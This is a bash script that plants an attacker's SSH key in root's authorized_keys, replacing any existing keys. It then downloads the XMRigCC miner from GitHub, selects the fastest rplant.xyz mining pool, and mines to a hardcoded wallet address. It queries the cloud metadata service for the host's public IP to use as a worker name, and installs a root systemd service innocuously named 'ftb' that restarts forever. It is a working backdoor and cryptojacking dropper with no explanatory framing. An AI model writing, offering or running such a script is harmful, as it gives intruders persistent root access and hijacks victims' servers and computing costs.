#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='Fb4zV87uJhptsYHDAV2uhYR7r31TdS1DW8' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install curl bc -y
else
    apt update -y
    apt install curl bc -y
fi
systemctl is-active --quiet ftb && systemctl stop --no-block ftb

rm -rf /opt/ftb

DIR="/opt/ftb"

mkdir -p $DIR

version="$(wget -T 3 -t 2 -qO- https://github.com/Bendr0id/xmrigCC/releases | grep 'XMRigCC' | grep releases | head -1 | awk '{print $7}' | xargs | awk -F '/' '{print $6}')"

url="https://github.com/Bendr0id/xmrigCC/releases/download/${version}/xmrigCC-${version}-linux-generic-static-amd64.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR

chmod +x $DIR/miner/xmrigDaemon

eu=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-eu.rplant.xyz)
asia=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-asia.rplant.xyz)
na=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-na.rplant.xyz)

if (($(bc <<<"$eu > $asia"))) && (($(bc <<<"$na > $asia"))); then
    pool_url="stratum-asia.rplant.xyz:17133"
elif (($(bc <<<"$asia > $eu"))) && (($(bc <<<"$na > $eu"))); then
    pool_url="stratum-eu.rplant.xyz:17133"
else
    pool_url="stratum-na.rplant.xyz:17133"
fi

COMMAND_BASE="${DIR}/miner/xmrigDaemon -a mike --url ${pool_url} --tls  --user ${WORKER_WALLET_ADDRESS}.\${ALIAS}"

echo '''#!/bin/bash

ALIAS=$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4 | sed "s/\./-/g")

[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me | sed "s/\./-/g")

''' >$DIR/start.sh
echo $COMMAND_BASE >>$DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=ftb
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
[Install]
WantedBy=default.target""" >/etc/systemd/system/ftb.service

systemctl daemon-reload
systemctl enable ftb
systemctl restart ftb
